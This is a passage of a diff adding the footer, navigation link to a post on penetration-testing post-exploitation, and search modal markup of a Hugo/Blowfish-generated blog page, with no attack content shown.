+            <a class="flex text-right group ml-3" href="/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Part 7 Advanced Network Penetration Testing Post Exploitation</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-07-19T07:17:09&#43;00:00">19 Jul, 2024</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+        <ul class="flex flex-col list-none sm:flex-row">
+          
+            <li
+              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li
+              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/categories/"
+                title="Categories">
+                
+                Categories
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          Valentin B
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
